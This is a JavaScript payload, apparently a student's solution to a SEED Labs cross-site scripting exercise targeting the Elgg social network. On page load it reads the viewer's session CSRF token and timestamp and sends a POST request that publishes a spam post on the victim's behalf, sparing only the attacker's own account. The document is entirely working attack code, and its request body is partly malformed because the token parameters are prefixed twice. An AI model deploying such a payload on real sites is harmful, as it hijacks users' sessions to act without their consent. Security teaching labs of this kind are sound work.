<script type="text/javascript">
	window.onload = function(){
		// JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		// and Security Token __elgg_token
		var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
		var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
		// Construct the content of your url.
		var samyguid = 59;
		var userguid = elgg.session.user.guid;
		var usrrname = elgg.session.user.name;
		var roll = 1905067 ; 
		var sendurl = "http://www.seed-server.com/action/thewire/add";
		
        var content = "__elgg_token=" + token + "&__elgg_ts=" + ts +
        "&body=To earn 12 USD/Hour(!), visit now\n" + encodeURIComponent('http://www.seed-server.com/profile/samy');
		var formData = new FormData();
		formData.append("__elgg_token", token);
		formData.append("__elgg_ts", ts);
		formData.append("body", "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy");
    
		
		if(userguid != samyguid) {
			// Create and send Ajax request to modify profile
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST", sendurl, true);
			Ajax.setRequestHeader("Host", "www.seed-server.com");
			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			Ajax.send(content);
			//Ajax.send(formData);
		}
	}

	function generateRandomString() {
		return Math.random().toString(36).substring(7);
	}
</script>
